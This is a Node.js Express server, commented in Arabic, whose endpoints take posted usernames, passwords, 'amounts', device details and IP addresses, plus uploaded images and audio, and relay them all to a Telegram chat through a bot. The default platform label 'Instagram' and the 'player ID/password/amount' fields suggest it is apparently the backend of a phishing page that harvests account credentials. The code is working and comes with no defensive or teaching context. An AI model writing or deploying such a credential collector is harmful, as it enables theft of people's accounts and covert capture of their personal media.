require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// تكوين multer للتعامل مع رفع الملفات
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const uploadsDir = 'uploads/';
    if (!fs.existsSync(uploadsDir)) {
      fs.mkdirSync(uploadsDir);
    }
    cb(null, uploadsDir);
  },
  filename: function (req, file, cb) {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({ storage: storage });

// خدمة الملفات الثابتة للملفات المرفوعة
app.use('/uploads', express.static('uploads'));

// الحصول على التوكن من متغير البيئة
const BOT_TOKEN = process.env.BOT_TOKEN;

// التحقق من وجود التوكن
if (!BOT_TOKEN) {
  console.error('❌ Telegram Bot Token is not configured');
  process.exit(1);
}

// وظيفة لإرسال رسالة إلى Telegram
async function sendToTelegram(chatId, message, filePath = null) {
  try {
    if (filePath) {
      // إذا كان هناك ملف، أرسله مع الرسالة
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('caption', message);
      formData.append('document', fs.createReadStream(filePath));
      
      const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, formData, {
        headers: formData.getHeaders()
      });
      
      return response.data.ok;
    } else {
      // إذا لم يكن هناك ملف، أرسل الرسالة فقط
      const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      });
      
      return response.data.ok;
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error.response?.data || error.message);
    return false;
  }
}

// نقطة النهاية لاستقبال بيانات التسجيل
app.post('/send-to-telegram', async (req, res) => {
  try {
    const { playerId, password, amount, chatId, platform = "انستقرام", device } = req.body;
    
    // التحقق من البيانات المطلوبة
    if (!playerId || !password || !amount || !chatId) {
      return res.status(400).json({
        success: false,
        message: 'بيانات ناقصة: يرجى التأكد من إرسال جميع البيانات المطلوبة'
      });
    }

    const userDevice = device || req.headers['user-agent'] || "غير معروف";
    
    // الحصول على عنوان IP المستخدم
    let userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    if (userIP === '::1') userIP = '127.0.0.1 (localhost)';
    
    const message = `♦️ - تم تسجيل حساب جديد 

🔹 - اسم المستخدم: ${playerId}
🔑 - كلمة المرور: ${password}
💰 - المبلغ: ${amount}
📱 - الجهاز: ${userDevice}
🌍 - IP: ${userIP}
🔄 - المنصة: ${platform}`;

    // إرسال الرسالة إلى Telegram
    const success = await sendToTelegram(chatId, message);
    
    if (success) {
      res.json({
        success: true,
        message: 'تم إرسال البيانات إلى Telegram بنجاح',
        orderId: `#${Math.floor(100000 + Math.random() * 900000)}`
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'فشل في إرسال الرسالة إلى Telegram'
      });
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ أثناء إرسال البيانات',
      error: error.message
    });
  }
});

// نقطة النهاية لاستقبال بيانات التسجيل العامة
app.post('/register', async (req, res) => {
  try {
    const { username, password, ip, chatId } = req.body;
    
    if (!username || !password || !ip || !chatId) {
      return res.status(400).json({ 
        success: false,
        error: 'Missing required fields: username, password, ip, and chatId are required' 
      });
    }

    const message = `📝 تسجيل حساب جديد\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}\n🌐 عنوان IP: ${ip}`;
    
    const success = await sendToTelegram(chatId, message);
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال البيانات إلى Telegram بنجاح' 
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال البيانات إلى Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing registration:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// نقطة النهاية لاستقبال الصور
app.post('/upload-image', upload.single('image'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ 
        success: false,
        error: 'No image file provided' 
      });
    }

    const { username, imageType, chatId } = req.body;
    const imagePath = req.file.path;
    
    let message = `🖼️ تم استقبال صورة جديدة`;
    if (username) message += `\n👤 المستخدم: ${username}`;
    if (imageType) message += `\n📸 نوع الصورة: ${imageType}`;
    
    const success = await sendToTelegram(chatId, message, imagePath);
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال الصورة إلى Telegram بنجاح' 
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال الصورة إلى Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing image upload:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// نقطة النهاية لاستقبال ملفات الصوت
app.post('/upload-audio', upload.single('audio'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ 
        success: false,
        error: 'No audio file provided' 
      });
    }

    const { username, chatId } = req.body;
    const audioPath = req.file.path;
    
    let message = `🎵 تم تسجيل صوت جديد`;
    if (username) message += `\n👤 المستخدم: ${username}`;
    
    const success = await sendToTelegram(chatId, message, audioPath);
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال الصوت إلى Telegram بنجاح' 
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال الصوت إلى Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing audio upload:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// نقطة النهاية للتحقق من عمل السيرفر
app.get('/health', (req, res) => {
  res.status(200).json({ 
    success: true,
    status: 'Server is running',
    tokenConfigured: !!BOT_TOKEN
  });
});

// بدء السيرفر
app.listen(PORT, () => {
  console.log(`✅ Server is running on port ${PORT}`);
});

// تنظيف الملفات المؤقتة بشكل دوري (اختياري)
setInterval(() => {
  const uploadsDir = 'uploads/';
  if (fs.existsSync(uploadsDir)) {
    fs.readdir(uploadsDir, (err, files) => {
      if (err) {
        console.error('Error reading uploads directory:', err);
        return;
      }
      
      const now = Date.now();
      const oneHour = 60 * 60 * 1000; // ساعة واحدة بالميلي ثانية
      
      for (const file of files) {
        const filePath = path.join(uploadsDir, file);
        fs.stat(filePath, (err, stat) => {
          if (err) {
            console.error('Error getting file stats:', err);
            return;
          }
          
          if (now - stat.mtimeMs > oneHour) {
            fs.unlink(filePath, err => {
              if (err) {
                console.error('Error deleting file:', err);
              } else {
                console.log(`تم حذف الملف القديم: ${filePath}`);
              }
            });
          }
        });
      }
    });
  }
}, 60 * 60 * 1000); // التشغيل كل ساعة
